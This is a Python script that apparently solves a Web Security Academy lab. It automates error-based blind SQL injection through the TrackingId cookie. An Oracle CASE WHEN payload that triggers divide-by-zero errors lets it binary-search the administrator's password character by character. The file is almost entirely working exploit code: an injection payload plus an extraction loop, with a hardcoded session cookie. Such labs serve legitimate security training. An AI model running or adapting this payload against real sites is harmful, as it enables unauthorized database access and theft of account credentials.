import time
import requests
from itertools import chain

url = 'https://ac481f521e2b3bd780170bd7009400da.web-security-academy.net/'
cookies = {
    "TrackingId": '', 
    "session": "MbyzKrO4roWwO5KPxG6QBKHXkAp8KibO"
}

password = []
alphanumerics = [
        open('numbers.txt', 'r').read().split('\n'),
        open('lowercase.txt', 'r').read().split('\n')
]

# flatten
alphanumerics = list(chain.from_iterable(alphanumerics))

def getVal(i, char, op):
    return '\' UNION SELECT CASE WHEN (username = \'administrator\' and SUBSTR(password, {i}, 1) {op} \'{char}\') THEN TO_CHAR(1/0) ELSE NULL END FROM users --'.format(i=i, char=char, op=op)
num_http_calls = 0

for i in range(1, 7):
    start = 0
    end = len(alphanumerics)
    char_i = end//2

    while True:

        char = alphanumerics[char_i]

        print('===')
        print('end: {end}'.format(end=end))
        print('start: {start}'.format(start=start))
        print('char_i: {char_i}'.format(char_i=char_i))
        print('char: {char}'.format(char=char))

        val=getVal(i, char, '=')
        print(val)
        cookies['TrackingId'] = val
        
        response = requests.get(url, cookies=cookies)
        num_http_calls += 1
        if response.status_code == 500:
            password.append(char)
            print('>> character at position [{pos}] is [{char}]. password so far: [{password}].'.format(pos=i, char=char, password=password))
            break
        else:

            val=getVal(i, char, '<')
            print(val)
            cookies['TrackingId'] = val

            response = requests.get(url, cookies=cookies)
            num_http_calls += 1
            if response.status_code == 500:
                end = char_i
                char_i = (start+end)//2
            else:
                
                val=getVal(i, char, '>')
                print(val)
                cookies['TrackingId'] = val
        
                response = requests.get(url, cookies=cookies)
                num_http_calls += 1
                if response.status_code == 500:
                    start = char_i
                    char_i = (start+end)//2
                else:
                    print('>> Error is possible: {char} is neither < nor > nor = the character in the password at position {pos}'.format(char=char, pos=i))
    print('>>> character position [{pos}] is exhausted. password so far: [{password}]'.format(pos=i, password=password))

print(''.join(password))
print('number of http calls')
print(num_http_calls)